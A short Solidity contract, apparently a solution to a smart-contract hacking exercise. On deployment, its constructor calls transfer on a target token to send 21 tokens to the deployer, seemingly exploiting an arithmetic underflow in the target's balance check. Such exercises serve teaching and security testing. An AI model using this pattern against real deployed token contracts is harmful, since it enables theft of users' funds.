// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract AttackToken {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 21);
    }
}
